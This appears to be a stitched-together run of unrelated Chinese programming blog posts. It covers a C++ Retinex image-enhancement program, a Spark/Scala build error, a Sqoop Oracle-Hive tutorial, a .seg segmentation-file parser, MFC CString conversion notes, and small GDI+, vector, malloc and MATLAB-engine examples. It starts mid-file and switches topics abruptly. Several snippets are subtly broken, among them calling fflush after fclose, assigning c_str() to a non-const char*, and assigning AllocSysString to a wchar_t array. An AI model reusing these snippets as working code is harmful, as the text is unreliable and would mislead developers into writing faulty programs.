*pRes++=pow(*pOrg++,1.0/GAMMA);
} 
}
*/
//////////////////////////
// Contrast
//////////////////////////
void Contrast(BYTE *OrgImg,int x,int y,int width,int height,int blockw,int blockh,double &wcontrast,double &mcontrast)
{
	BYTE *pCur=OrgImg+x*blockw+y*width*blockh;
	double min=10000,max=-1;
	int i,j;

	for(i=0;i<blockh;i++,pCur=pCur+width-blockw)
	{
		for(j=0;j<blockw;j++,pCur++)
		{
			if(*pCur<min) min=*pCur;
			if(*pCur>max) max=*pCur;
		}
	}
	mcontrast=(max-min+1)/(max+min+1);
	if(min==0) wcontrast=(max+5)/(min+5);
	else wcontrast=max/min;

	return;
}

//////////////////////////
//  Measure of Performance
//////////////////////////
void Measure(BYTE *ResImg,int width,int height,double &emee,double &ame)
{
	int k1=8,k2=8,i,j,blockw,blockh;
	double wcontrast,mcontrast;
	blockw=width/k2;
	blockh=height/k1;
	emee=0;
	ame=0;
	for(i=0;i<k1;i++)
	{
		for(j=0;j<k2;j++)
		{
			Contrast(ResImg,i,j,width,height,blockw,blockh,wcontrast,mcontrast);
			emee+=pow(wcontrast,ALPHA_c)*log(wcontrast);
			ame+=pow(mcontrast,ALPHA_c)*log(mcontrast);
		}
	}
	emee=ALPHA_c*emee/(k1*k2);
	ame=ALPHA_c*ame/(k1*k2);
	return ;
}

/////////////////////////
// Gray Image Process
/////////////////////////
void GrayImageProcess(BYTE *OrgImg,int width,int height,BYTE *ResImg)
{
	int *Data,*LogImg,*Template,mean,dev;
	int Tsize;
	double c;
	Tsize=5;
	c=20;
	Template=new int[Tsize*Tsize];
	Data=new int[width*height];
	LogImg=new int[width*height];
	LocalNonlinearStretch(OrgImg,width,height,Data);	
	LogarithmTransform(Data,width,height,LogImg);
	//GaussianTemplate(Template,Tsize,c);
	GaussianTemplate2(Template,0.5);Tsize=3;
	SSR(LogImg,OrgImg,width,height,Data,Template,Tsize);
	GetMeanAndDeviance(Data,width,height,Tsize,&mean,&dev);
	LinearStretch(Data,width,height,&mean,&dev,ResImg);
	delete Template;
	delete Data;
	delete LogImg;
	return;
}

/////////////////////////
// Color Image Process
/////////////////////////
void ColorImageProcess(BYTE *OrgImg,int width,int height,BYTE *ResImg)
{
	BYTE *Value;
	int i,j,Tsize,temp;
	int *Data,*LogImg,*Template,*Percent,mean,dev;
	double c,emee,ame;
	Tsize=5;
	c=0.75;
	Template=new int[Tsize*Tsize];
	Data=new int[width*height];
	LogImg=new int[width*height];
	Percent=new int[width*height*3];
	Value=new BYTE[width*height];
	memset(Value,0,sizeof(BYTE)*width*height);
	for(j=0;j<width*height;j++)
	{  
		temp=0;
		for(i=0;i<3;i++)
		{ 
			temp+=*(OrgImg+j*3+i);
		}
		for(i=0;i<3;i++)
		{ 
			*(Percent+j*3+i)=*(OrgImg+j*3+i)/double(temp)*2048;
			*(Value+j)+=(*(OrgImg+j*3+i)*(*(Percent+j*3+i)))>>11;
		}
	}
	LocalNonlinearStretch(Value,width,height,Data);
	LogarithmTransform(Data,width,height,LogImg);
	//  GaussianTemplate(Template,Tsize,c);
	GaussianTemplate2(Template,0.5);Tsize=3;
	SSR(LogImg,Value,width,height,Data,Template,Tsize);
	GetMeanAndDeviance(Data,width,height,Tsize,&mean,&dev);
	LinearStretch(Data,width,height,&mean,&dev,Value);
	for(j=0;j<width*height;j++)
	{
		for(i=0;i<3;i++)
		{ 
			temp=(*(Percent+j*3+i)*(*(Value+j))*3)>>11;
			if(temp>255) *(ResImg+j*3+i)=255;
			else *(ResImg+j*3+i)=temp;
		}
	}
	printf("*****彩色图像三通道联合处理结果******************\n");
	Measure(Value,width,height,emee,ame);
	cout<<"EMEE:"<<emee<<endl;
	delete Template;
	delete Data;
	delete LogImg;
	delete Value;
	delete Percent;
	return;
}


//////////////////////////
//  Color Image process 2
//  三通道分别处理
//////////////////////////
void ColorImageProcess2(BYTE *OrgImg,int width,int height,BYTE *ResImg)
{
	BYTE *Value;
	int i,j,Tsize;
	int *Data,*LogImg,*Template,mean,dev;
	double c,emee=0,ame=0,x1,x2;
	Tsize=5;
	c=0.5;
	Template=new int[Tsize*Tsize];
	Value=new BYTE[width*height];	
	Data=new int[width*height];
	LogImg=new int[width*height];
	GaussianTemplate(Template,Tsize,c);
	//      GaussianTemplate2(Template,0.5);	Tsize=3;
	for(i=0;i<3;i++)
	{
		for(j=0;j<width*height;j++)
		{
			*(Value+j)=*(OrgImg+j*3+i);
		}
		LocalNonlinearStretch(Value,width,height,Data);
		LogarithmTransform(Data,width,height,LogImg);
		SSR(LogImg,Value,width,height,Data,Template,Tsize);	
		GetMeanAndDeviance(Data,width,height,Tsize,&mean,&dev);
		LinearStretch(Data,width,height,&mean,&dev,Value);
		Measure(Value,width,height,x1,x2);
		emee+=x1;
		ame+=x2;
		for(j=0;j<width*height;j++)
		{
			*(ResImg+j*3+i)=*(Value+j);
		}
	}
	printf("*****彩色图像三通道分别处理结果******************\n");
	cout<<"EMEE:"<<emee/3.0<<endl;		
	delete Template;
	delete Value;
	delete Data;
	delete LogImg;
	return;
}

 
 
 
 
// Retinex.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include "Retinex.h"
//////////////////////////
//  main
//////////////////////////
int main()
{   
	BYTE *OrgImg,*ResImg,*p1,*p2;
	int width,height,i,j,suc,area1,area2,Tsize;
	bool isRGB,ret;
	clock_t t1,t2;
	double emee,ame;
	char ch;
	int *offsetdata=new int[2];
	for(i=0;i<2;i++)
	{
		*(offsetdata+i)=0X80808080;
	}    
	system( "cls" );	
	printf("******中心/环绕Retienx算法******************\n");
	printf("       1.处理灰度图像\n");
	printf("       2.处理彩色图像\n");
	printf("*********************************************\n");
	printf("请选择(1或2): ");	
	do
	{
		cin>>ch; 
	}while( ch != '1' && ch != '2');

	//system ( "cls" );


	if ( ch == '1')
		isRGB=false;
	else if ( ch == '2')
		isRGB=true;
	// open file

	string image_name;
	cout<<endl<<"输入图像名：";
	cin>>image_name;

	Mat image_dst;

	if (!isRGB)
	{
		image_dst = imread(image_name,0);
	}
	else
	{
		image_dst = imread(image_name,1);
	}

	
	
	if(image_dst.empty())
	{
		return -1;
	} //是否加载成功

	imshow(image_name,image_dst);
	

	 width = image_dst.cols;  
	 height = image_dst.rows;  
	int channel = image_dst.channels(); 
	 int step = width * channel* 1;
	uchar* ps = NULL;
	
	p1 = new BYTE[width*height*channel+8];

	for (int i = 0; i < height; i++)  
	{  
		ps = image_dst.ptr<uchar>(i); 
		int bmp_i = height -1 -i;//图片上下倒置
		for (int j = 0; j <width; j++)  
		{  
			if (1 == channel)  
			{  
				*(p1 + i*step + j) = ps[j];  
				
			}  
			else if (3 == channel)  
			{  //opencv的顺序是bgr,bmp本来是grb？
				*(p1 + bmp_i*step + j*3) = ps[j*3];  //b
				*(p1 + bmp_i*step + j*3 + 1) = ps[j*3 + 1];  //g
				*(p1 + bmp_i*step + j*3 + 2) = ps[j*3 + 2];  //r
			}  
		}  
	}  

	BYTE* px;
	

	if(!isRGB)
		px = Read8BitBmpFile2Img(image_name.c_str(),&width,&height);
	else
		px = Read24BitBmpFile2Img(image_name.c_str(),&width,&height);


	int len = width*height*channel;
	int huanhang = width *channel;


	FILE *pFile1 = fopen("out_opencv.txt",     "w"); // 文件打开方式 如果原来有内容也会销毁
	FILE *pFile2 = fopen("out_ori.txt",     "w"); // 文件打开方式 如果原来有内容也会销毁

	for (int i = 1;i <=len;i++)
	{
		fprintf(pFile1,"%d\t",(int)*(p1+i));
		if (i % (huanhang)==0)
		{
			fprintf(pFile1,"\n");
		
		}

	}
	cout<<"下面是正常的"<<endl;

	for (int i = 1;i <=len;i++)
	{
		fprintf(pFile2,"%d\t",(int)*(px+i));

		if (i % huanhang==0)
		{
			fprintf(pFile2,"\n");
		}

	}

	fclose(pFile1);
	fclose(pFile2);
	fflush(pFile1);
	fflush(pFile2);

	if (p1==NULL)
	{  
		printf("*fopen err!\n");
		delete p1;
		return 0;
	}
	if(width%64!=0||height%64!=0)
	{
		cout<<"图像大小需是64的倍数"<<endl;
		delete p1;
		return 0;
	}

	area1=width*height;

	if(!isRGB)
	{
		OrgImg=p1+8-int(p1)%8;	
		p2=new BYTE[width*height+8];
		ResImg=p2+8-int(p2)%8;
		t2=clock();
		GrayImageProcess(OrgImg,width,height,ResImg);
		t1=clock();
		printf("*****灰度图像处理结果******************\n");
		cout<<"运行时间："<<t1-t2<<"ms"<<endl;
		Measure(ResImg,width,height,emee,ame);
		cout<<"EMEE:"<<emee<<endl;
		suc=Write8BitImg2BmpFile(ResImg,width,height,"result_1.bmp");
	}
	else
	{	
		OrgImg=p1;//+8-int(p1)%8;	
		p2=new BYTE[width*height*3+8];		
		ResImg=p2;//+8-int(p2)%8;
		t2=clock();
		ColorImageProcess(OrgImg,width,height,ResImg);
		t1=clock();
		cout<<"运行时间："<<t1-t2<<"ms"<<endl;
		t2=clock();
		suc=Write24BitImg2BmpFile(ResImg,width,height,"result_1.bmp");
		ColorImageProcess2(OrgImg,width,height,ResImg);
		t1=clock();
		cout<<"运行时间："<<t1-t2<<"ms"<<endl;
		suc=Write24BitImg2BmpFile(ResImg,width,height,"result_2.bmp");
	}
	if(suc==-1)
	{
		printf("*fwrite err!\n");  
	}

	Mat result1 = imread("result_1.bmp",1);
	Mat result2 = imread("result_2.bmp",1);

	imshow("result1",result1);
	imshow("result2",result2);
	//release mem
	delete p1;
	delete p2;


	waitKey(0);
	return 0;
}





 
 
 
   
 






不知道下面的错误是为什么？


Error:scalac: missing or invalid dependency detected while loading class file 'RDD.class'.
Could not access term hadoop in package org.apache,
because it (or its dependencies) are missing. Check your build definition for
missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.)
A full rebuild may help if 'RDD.class' was compiled against an incompatible version of org.apache.



我i下面这个version应该写啥？写1.6.1 不对啊，没有找到




想跑一下下面的代码，死活有问题，哎，我就很讨厌java这套东西，环境配置半天不说，还慢的要死




/**
  * Created by Administrator on 2016/3/31.
  */

import org.apache.spark.{SparkConf, SparkContext}
/**
  * Created by Administrator on 2016/3/31.
  */
import scala.math.random

import org.apache.spark._
object simpleApp {
  def main(args: Array[String]) {
    val conf = new SparkConf().setAppName("Spark Pi").setMaster("local")
    val spark = new SparkContext(conf)
    val slices = if (args.length > 0) args(0).toInt else 2
    val n = math.min(100000L * slices, Int.MaxValue).toInt // avoid overflow
    val count = spark.parallelize(1 until n, slices).map { i =>
        val x = random * 2 - 1
        val y = random * 2 - 1
        if (x*x + y*y < 1) 1 else 0
      }.reduce(_ + _)
    println("Pi is roughly " + 4.0 * count / n)
    spark.stop()
  }
}

下面分享一个ibm 大数据基础的培训资料：
http://download.csdn.net/detail/wangyaninglm/9478412












Sqoop是一个用来将hadoop和关系型数据库中的数据相互转移的工具，可以将一个关系型数据库(例如：mysql,oracle,等)中的数据导入到hadoop的HDFS中，也可以将HDFS的数据导入到关系型数据库中。

1.简介
首先切换到到hadoop用户：su - hadoop
温馨提示：oracle的所有表名列名都要大写！！！ 
下面的代码，在命令行输入的时候，可能要写成一行
比如第一条需要写成：
sqoop export --table Oracle_table_name --connect jdbc:oracle:thin:@ip:1521:数据库名 --username 用户名 --password 密码 --export-dir hdfs:/user/hive/warehouse/XXX --columns COLUMN1,2,3 --input-fields-terminated-by '\001' --input-lines-terminated-by '\n'
1.导hive表到Oracle
sqoop export 
--table Oracle_table_name 
--connect jdbc:oracle:thin:@ip:1521:数据库名 
--username 用户名
--password 密码
--export-dir hdfs:/user/hive/warehouse/XXX
--columns COLUMN1,2,3, 
--input-fields-terminated-by '\001'  #或者其他分隔符，比如逗号等
--input-lines-terminated-by '\n'
注意：导hive表是“\001”
–解释:
sqoop export  
–table Oracle_table_name（// 数据库Oracle的表名）
–connect jdbc:oracle:thin:@ip:1521:数据库名  
（//数据库的地址，其中1521为端口号，默认都为1521，ibd为数据库实例名）
–username用户名（//数据库用户名） 
–password用户名（//数据库密码）
–export-dir hdfs:/user/hive/warehouse/XXX 
（//hdfs上Hive表的绝对路径） 
–columns column1, column2… 
 (//数据库表的所有列名)
–input-fields-terminated-by ‘\001’（列分隔符） 
–input-lines-terminated-by ‘\n’ （行分隔符）
2. 查询数据导入到Oracle的数据是否成功
sqoop eval 
--connect jdbc:oracle:thin:@YOUR-IP-ADDRESS:1521:database-name
--username XXX
--password XXX
--query "select * from table_name"
3.导Oracle表到hive表
sqoop import 
--connect jdbc:oracle:thin:@YOUR-IP-ADDRESS:1521:database-name
--username xxx
--password xxx
--table TABLE_NAME
--columns COLUMN1,2,3...
--hive-import  
--hive-table  hive_table_name
-m 1
—解释: 
TABLE_NAME为oracle表名(切忌：Oracle个表名在命令中必须是大写，不然会报错) 
hive_test为hive表名（hive中的这个表可以不用提前建，只用给表名即可，导成功后列名和Oracle表的列名相同）
4. 连接oracle数据库，列出数据库中的表
sqoop list-tables 
--connect jdbc:oracle:thin:@YOUR-IP-ADDRESS:1521:database-name
--username xxx
--password xxx
5.从数据库导出表的数据到HDFS文件(这个比较实用)
sqoop import 
--connect jdbc:oracle:thin:@YOUR-IP-ADDRESS:1521:database-name
--username xxx
--password xxx
--table DD
--m 1 
--target-dir /home/dpt 
解释： 
DD为oracle表名(切忌：Oracle表名在命令中必须是大写，不然会报错)； 
/home/dpt为目的目录，如果没有这个目录则会在hdfs上自动创建这个目录. 
导成功后可以用命令查看：
hadoop fs -text /home/dpt/part-m-00000
6.分区表的导入
通过sqoop将hive中的表导入到oracle中
sqoop export 
--table t_amap_all 
--connect jdbc:oracle:thin:@YOUR-IP-ADDRESS:1521:database-name
--username xxx
--password xxx
--export-dir  hdfs://user/hive/warehouse/ 
--columns 1,2,3... 
--input-fields-terminated-by '\t' 
--input-lines-terminated-by '\n';
导入分区表需要指定到具体分区目录，不然会找不到数据，在oracle表中能指定分区这个字段！ 
分隔符要遵循hive表的具体分隔符
导致任务失败有可能是表名不一致，字段不一致，oracle中的字段大小不够

2.可能遇到的问题

连接oracle数据库，列出数据库中的表时

sqoop list-tables 
--connect jdbc:oracle:thin:@YOUR-IP-ADDRESS:1521:database-name
--username xxx
--password xxx
报错： 
16/01/28 09:27:15 ERROR sqoop.Sqoop: Got exception running Sqoop: java.lang.RuntimeException: Could not load db driver class: oracle.jdbc.OracleDriver 
则  
1)发现sqoop的安装目录 /usr/lib/sqoop/lib中缺ojdbc驱动包,然后将驱动包（ojdbc6-11.2.0.1.0.jar）复制到your-ip的sqoop安装目录就可以了： 
scp  ./ojdbc6-11.2.0.1.0.jar  root@your-ip:/usr/lib/sqoop/lib

参考链接
1.下载链接： 
https://github.com/apache/sqoop 
2.官方文档： 
http://sqoop.apache.org/docs/1.4.6/SqoopUserGuide.html#_introduction 
3.官网： 
http://sqoop.apache.org/ 






之前看到
﻿﻿
http://www.eecs.berkeley.edu/Research/Projects/CS/vision/grouping/segbench/
提供的人工图像分割的.seg格式的文件，他们提供了linux系统下面的matlab代码，什么的，但是我们要在windows平台下面用就比较麻烦，就心血来潮写一个试试，还请大牛们指点一二啊，嘿嘿嘿

下面是SegHuman.h

/*
// # Reload me!
// 
// SEGMENTATION FILE FORMAT
// 	David Martin
// 	8/2/2001
// 
// 	This document describes the segmentation file format.  Segmentation
// 	files end in ".seg".
// 
// 	The overall structure of the file is as follows:
// 
// <header>
// 	data
// 	<data>
// 
// 	The first part of the file is the header.  The header is ascii text,
// 	and can contain comments.  The comment character is '#'.  The header
// 	is separated from the data with a line containing the literal text
// 	"data".
// 
// 	The header can contain the following information, in any order:
// 
// format {*ascii|binary} {*cr|map}
// date <date string>
// 	image <int>	# image ID number
// 	user <int>	# user ID number
// 	width <int>	# width of image
// 	height <int>	# height of image
// 	segments <int>	# number of segments
// 	gray {*0|1}	# image presented in grayscale?
// 	invert {*0|1}	# image presented with pixel values inverted?
// 	flipflop {*0|1}	# image presented upside-down and backwards?
// 
// 	The {width,height,segments} lines are required.  All others lines are
// 	optional.  Default values are marked with a '*'.
// 
// 	The format line describes the format of the data section of the file.
// 	The default and recommended format is 'ascii cr' (cr = compressed
// 	row).  This document does not describe the other formats, as they are
// 	probably superfluous.
// 
// 	The 'ascii cr' format is designed to be very easy to parse; it is not
// 	optimized for space.  Use gzip if you want smaller files!  Each line
// 	in the data section contains 4 integers:
// 
// <s> <r> <c1> <c2>
// 
// 	All values start counting at 0.  <s> is the segment number; <r> is the
// 	row; <c1> and <c2> are column numbers.  The line means that columns
// 	[<c1>..<c2>] of row <r> belong to segment <s>.  Lines of this sort can
// 	appear in any order, and can be reordered without harm.  The only
// 	restriction is that each pixel must be named exactly once.
// 
// 	END
// 
// 
*/


#ifndef SEG_HUMAN
#define SEG_HUMAN



#include "stdafx.h"
#include "stdio.h"
#include <map>
#include <vector>
#include <queue>
#include <set>
#include <string>
#include <list>

#include <iostream>
using namespace std;

struct SEG
{
	int segment_number;
	int row;
	int column_number1;
	int column_number2;
};

class SegHuman
{
public:
	SegHuman(const char* path);
	bool LoadSEG(const char* path);

private:
	string name;
	int image_index;
	int segments_index;
	int height;
	int width;
	int gray;
	vector<SEG> MySeg;
};


#endif // SEGHMAN



下面是：SegHuman.cpp
#include "stdafx.h"
#include "SegHuman.h"

#include <iostream>
using namespace std;

SegHuman::SegHuman(const char* path)
{
	LoadSEG(path);
}

bool SegHuman::LoadSEG(const char* path)
{
int st = 0;
FILE* pfile = fopen(path, "r");
if (pfile)
{
	fseek(pfile,0,SEEK_END);
	int dwsize = ftell(pfile);
	rewind(pfile);

	char* filebuffer = new char[dwsize];
	fread(filebuffer, 1, dwsize, pfile);


	char* pBegin = filebuffer;
	char* pEnd = strchr(filebuffer, '\n');
	int uiIndex = 1;

	int st = 0;

	while (pEnd != NULL)
	{

		std::string strbuff;
		strbuff.insert(0, pBegin, pEnd-pBegin);
		if (strbuff.empty())
		{
			return false;
		}

		if (st==0) 
		{
		if (1 == sscanf(strbuff.c_str(),"image %d",&image_index)) st=1;
		} 
		else if (st==1)
		{
			if (1 == sscanf(strbuff.c_str(),"width %d",&width)) st=2;
		}
		else if (st==2)
		{
			if (1 == sscanf(strbuff.c_str(),"height %d",&height)) st=3;
		}
		else if (st==3)
		{
			if (1 == sscanf(strbuff.c_str(),"segments %d",&segments_index)) st=4;
		}
		else if (st==4)
		{
			if (1 == sscanf(strbuff.c_str(),"gray %d",&gray)) st=5;
		}
		else if (st==5)
		{
			if (0==strcmp(strbuff.c_str(),"data")) st=6;
		}
		else if (st==6)
		{
			SEG temp = { -1, -1, -1, -1};
if (4 == sscanf(strbuff.c_str(),"%d %d %d %d",&temp.segment_number, &temp.row, &temp.column_number1 , &temp.column_number2)) 
			{
				++uiIndex;
				MySeg.push_back(temp);
					
			}
	}


			pBegin = pEnd + 1;
			pEnd = strchr(pEnd + 1, '\n');
			
		}
		delete[] filebuffer;
		fclose(pfile);

		vector<SEG>::iterator iter = MySeg.begin();
		for (;iter !=MySeg.end(); ++iter)
		{
			cout<<iter->segment_number<<' ';
			cout<<iter->row<<' ';
			cout<<iter->column_number1 <<' ';
			cout<<iter->column_number2<<' ';
			cout<<endl;

		}
		getchar();

		return true;
	}

	return false;
}


下面的任务就是修改代码，把它用在OpenCV中，来显示人工分割的图像啦!








 
  VC之CString,wchar_t,int,string,char*之间的转换


1. CString 转 wchar_t
CString path = "asdf";
wchar_t wstr[256] = path.AllocSysString();
或者：
wchar_t wcstring[256];
MultiByteToWideChar(CP_ACP,0,path,-1,wcstring,256);
 
2. wchar_t转CString
WideCharToMultiByte(CP_ACP,0,wcstring,256,path.GetBuffer(0),256,NULL,NULL);
path.ReleaseBuffer(0);
 
3. string 转 CString
CString.format("%s", string.c_str());
 
4. char 转 CString
CString.format("%s", char*);
 
5. char 转 string
string s(char *);
 
6. string 转 char *
char *p = string.c_str();
 
7.CString 转 string
string s(CString.GetBuffer());
CString   str   =   "fdjfdas";  

string   s   =   (LPCTSTR)str;
 
 
 
1，string -> CString
CString.format("%s", string.c_str());
用c_str()确实比data()要好.


2，char -> string
string s(char *);
你的只能初始化，在不是初始化的地方最好还是用assign().
 

3,CString -> string
string s(CString.GetBuffer());
GetBuffer()后一定要ReleaseBuffer(),否则就没有释放缓冲区所占的空间.
 
 
《C++标准函数库》中说的
有三个函数可以将字符串的内容转换为字符数组和C—string
1.data(),返回没有”\0“的字符串数组
2,c_str()，返回有”\0“的字符串数组
3，copy()
---------------------------------------------------------------
CString与int、char*、char[100]之间的转换- -
CString与int、char*、char[100]之间的转换- -
CString互转int
 
 
将字符转换为整数，可以使用atoi、_atoi64或atol。
而将数字转换为CString变量，可以使用CString的Format函数。如
CString s;
int i = 64;
s.Format("%d", i)
Format函数的功能很强，值得你研究一下。
 
 
void CStrDlg::OnButton1()
{
// TODO: Add your control notification handler code here
CString ss="1212.12";
int temp=atoi((char*)LPCTSTR(ss));
CString aa;
aa.Format("%d",temp);
AfxMessageBox("var is " + aa);
}
sart.Format("%s",buf);
 
 
 
CString互转char*
 
 
///char * TO cstring
CString strtest;
char * charpoint;
charpoint="give string a value";
strtest=charpoint;
///CString TO char *
charpoint=strtest.GetBuffer(strtest.GetLength());
标准C里没有string,char *==char []==string
 
 
char *转成CString
 
 
可以用CString.Format("%s",char *)这个方法来将char *转成CString。
CString转成char *
用操作符（LPCSTR）strtest 或者 (char*)（LPCSTR）strtest 就可以了。
CString转换 char[100]
char a[100];
CString str("aaaaaa");
strncpy(a,(LPCTSTR)str,sizeof(a));
Trackback: http://tb.blog.csdn.net/TrackBack.aspx?PostId=1570001
 
 
 
(一) 概述
string和CString均是字符串模板类，string为标准模板类（STL）定义的字符串类，已经纳入C++标准之中；
CString（typedef CStringT > CString）为Visual C++中最常用的字符串类，继承自CSimpleStringT类，主要应用在MFC和ATL编程中，主要数据类型有char(应用于ANSI)，wchar_t(unicode)，TCHAR(ANSI与unicode均可)；
char*为C编程中最常用的字符串指针，一般以'\0'为结束标志；
 
 
 
(二) 构造
string是方便的，可以从几乎所有的字符串构造而来，包括CString和char*；
CString次之，可以从基本的一些字符串变量构造而来，包括char*等；
char*没有构造函数，仅可以赋值；
举例：
char* psz = “joise”;
CString cstr( psz );
string str( cstr );
 
 
(三) 运算符重载
a) operator=
string是最方便的，几乎可以直接用所有的字符串赋值，包括CString和char*；
CString次之，可以直接用些基本的字符串赋值，包括char*等；
char*只能由指针赋值，并且是极危险的操作，建议使用strcpy或者memcpy，而且char*在声明的时候如未赋初值建议先设为NULL，以避免野指针，令你抓狂；
举例：
char *psz = NULL;
psz = new char[10]; //当然，以上的直接写成char *psz = new char[10];也是一样
memset( psz, 0, 10 );
strcpy( psz, “joise” );
CString cstr;
cstr = psz;
string str;
str = psz;
str = cstr;
delete []psz;
b) operator+
string与CString差不多，可以直接与char*进行加法，但不可以相互使用+运算符，即string str = str + cstr是非法的，须转换成char*；
char*没有+运算，只能使用strcat把两个指针连在一起；
举例：
char* psz = “joise”;
CString cstr = psz;
cstr = cstr + psz;
string str = psz;
str = str + str + psz;
strcat( psz, psz );
strcat( psz, cstr );//合法
strcat( psz, str );//非法，由此可见，CString可自动转换为const char*，而string不行
c) operator +=
string是最强大的，几乎可以与所有的字符串变量+=，包括CString和char*；
CString次之，可以与基本的一些字符串变量进行+=而来，包括char*等；
char*没有+=运算符，只能使用strcat把两个指针连在一起；
d) operator[]
CString最好，当越界时会抛出断言异常；
string与char*下标越界结果未定义；
举例：
char* psz = “joise”;
CString cstr = psz;
cout << cstr[8];
string str = psz;
cout << str[8];
cout << psz[8];
e) operator== 、operator!=、operator> 、operator< 、operator>= 、perator<=
CString与string之间不可以进行比较，但均可以与char*进行比较，并且比较的是值，而不是地址；
cout << ( psz == cstr );
cout << ( psz == str );
cout << ( str == psz );
cout << ( cstr == psz );//以上代码返回均为1
 
 
(四) 常用算法
a) 查找
 
作用 char* string CString
查找指定值 strchr
strstr
strrstr
strspn find Find
第一个匹配的值 fild_first_of FindOneOf 从后面开始查找 ReserveFind 指定匹配方式 find_if 
注：find_if中是把范围内的值挨个代入匹配函数直至返回true
 
b) 比较
 
作用 char* string CString 查找指定值(区分大小写) strcmp
strncmp
strcoll
_strncoll operator<
operator>
operator<=
operator>=
operator==
operator!= Collate
Compare 查找指定值(不区分大小写) _stricmp
_strnicmp
_stricoll
_strnicoll CollateNoCase
CompareNoCas 
注：返回值如果<0则前面的值小于后面的值，反之亦然
 
c) 替换
 
作用 char* string CString 查找指定值 _strset
_strnset
replace
replace_copy
replace_copy_if
replace_if Replace 


d) 插入
 
作用 char* string CString 查找指定值 insert Insert

 
e) 增加 作用 char* string CString 动态增加值 strcat push
append Append
AppendChar
AppendFormat
 
f) 截取
 
作用 char* string CString 得到部分值 用下标操作 substr Left
Mid
Right
Truncate
 
g) 移除
 
作用 char* string CString 移除部份值 remove Remove 移除空白值 RemoveBlanks
注：此为ATL提供，非C函数 remove_if Trim
TrimLeft
TrimRig
 
h) 转换大小写
 
作用 char* string CString 转换大小写 _strlwr
_strupr MakeLower
MakeUpper
 
i) 与其他类型转换
 
作用 char* string CString 转化为数字 atoi
atod
atof Format 转化为char* c_str
GetBuffer
GetBufferSetLen 
j) 格式化
作用 char* string CString 格式化 sprintf Format
k) 得到长度
作用 char* string CString
得到长度 strlen length GetLength 得到大小 size GetAllocLength 
l) 判断为空
作用 char* string CString 判断是否为空判断是否==NULL或者第一个字符是否是'\0' empty IsEmpty

m) 重定义大小
作用 char* string CString 重定义大小 realloc
new resize GetBufferSetLength 
n) 释放资源
作用 char* string CString 释放 free
delete (delete[]) ReleaseBuffer
ReleaseBufferSetLength
(五) 安全性>
CString > string > char*；
(六) 灵活性
CString > string >char*；
(七) 可移植性
char* = string > CString
*****************
CHAR 转CString之间等于就可以了啊！








代码：
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")

using namespace std;
using namespace Gdiplus;

int main() 
{
    GdiplusStartupInput gdiplusstartupinput;
    ULONG_PTR gdiplustoken;
    GdiplusStartup(&gdiplustoken, &gdiplusstartupinput, NULL);

    wstring infilename(L"1.jpg");
    string outfilename("color.txt");

    Bitmap* bmp = new Bitmap(infilename.c_str());
    UINT height = bmp->GetHeight();
    UINT width  = bmp->GetWidth();
    cout << "width " << width << ", height " << height << endl;

    Color color;
    ofstream fout(outfilename.c_str());

    for (UINT y = 0; y < height; y++)
    for (UINT x = 0; x < width ; x++)
        {
            bmp->GetPixel(x, y, &color);
            fout << x << "," << y << ";"
                 << (int)color.GetRed()   << ","
                 << (int)color.GetGreen() << ","
                 << (int)color.GetBlue()  << endl;
    }

    fout.close();

    delete bmp;
    GdiplusShutdown(gdiplustoken);
    return 0;
}







#include <vector>
#include <iostream>

using namespace std;

void print(vector<int>& v)//打印函数
{
	cout<<"-----------------------------------------------------"<<endl;
	cout<<"empty = "<<v.empty()<<endl;
	cout<<"size = "<<v.size()<<endl;
	cout<<"max_size = "<<v.max_size()<<endl;
	cout<<"capacity = "<<v.capacity()<<endl;
}

void reverse_print(vector<int>& v)//反向遍历vector元素
{
	vector<int>::reverse_iterator ri , riend;
	riend = v.rend();

	for (ri = v.rbegin();ri!=riend;ri++)
	{
		cout<<*ri<<endl;
	}

	
}

int main()
{
	vector<int> v;

	print(v);

	//添加5个元素
	v.push_back(1);
	v.push_back(2);
	v.push_back(3);
	v.push_back(4);
	v.push_back(5);
	print(v);

	// 再添加4个元素
	v.push_back(6);
	v.push_back(7);
	v.push_back(8);
	v.push_back(9);
	print(v);

	//调整vector数据空间大小
	v.reserve(40);
	print(v);

	reverse_print(v);

	getchar();
	return 0;

} 





// test_of_malloc.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include"stdio.h"
#include"stdlib.h"

unsigned maximum=0;

int _tmain(int argc, _TCHAR* argv[])
{
	unsigned blocksize[]={1024*1024,1024,1};
	int i,count;
	for(i=0;i<3;i++)
	{
		for(count = 1;;count++)
		{
			void *block=malloc(maximum+blocksize[i]*count);
			if(block)
			{
				maximum=maximum+blocksize[i]*count;
				free(block);
			}
			else
			{
				break;
			}
			printf("maximum malloc size = %u bytes\n",maximum);
			
		}
	}

	printf("maximum malloc size = %u bytes\n",maximum);
	getchar();

	return 0;
}


代码来自《程序员的自我修养》






// matlab_engine.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include "engine.h"
#include "windows.h"

#pragma comment(lib, "libeng.lib")
#pragma comment(lib, "libmx.lib")
#pragma comment(lib, "libmat.lib")

void main()
{
	Engine* pEng = NULL;
	if (!(pEng = engOpen(NULL)))
	{
		printf("Open matlab enging fail!");
		return;
	}

	//call Engine plot A*sin(t)+B A=2 B=1

	mxArray *A = NULL;

	double init = 2;
	A = mxCreateDoubleMatrix(1, 1, mxREAL);
	memcpy((void*) mxGetPr(A), (void*)&init, sizeof (double));
	engPutVariable(pEng, "A", A);

	init = 1;
	memcpy((void*) mxGetPr(A), (void*)&init, sizeof (double));
	engPutVariable(pEng, "B", A);

	mxDestroyArray(A);

	Sleep(3*60*1000);

	engEvalString(pEng, "t=0:0.2:7;plot(t,A*sin(t)+B);");

	if(NULL != pEng)
	{
		engClose(pEng);
	}

	//return 0;
}

 






vs2010的mfc在有些地方不太一样不容易注意到，今天在修改状态栏的时候，就碰见了问题，死活修改不了。
参照下面的帖子：
 
点击打开链接
 
:
 
使用VS2010更改MFC程序的状态栏
2011-04-19 17:12 by 愤怒的青蛙, 
783 阅读, 0 评论, 收藏, 
编辑


